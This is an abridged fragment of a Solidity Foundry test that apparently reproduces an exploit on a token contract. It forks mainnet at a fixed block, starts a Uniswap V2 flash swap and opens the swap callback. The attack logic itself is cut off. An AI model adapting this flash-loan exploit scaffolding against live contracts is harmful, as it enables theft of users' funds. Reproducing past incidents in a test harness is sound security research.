...
contract TheNFTV2Test is Test {
    ...
    function setUp() public {
        vm.createSelectFork("mainnet", 18647450);
    ...
    function test() public {
        ...
        uniswap.swap(0, 1906331836125411716, address(this), new bytes(1));
    ...
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (uint thedaoReserve, uint wethReserve, ) = uniswap.getReserves();
        emit log_named_uint("k0:", thedaoReserve * wethReserve);
        uint amountOut = amount1;
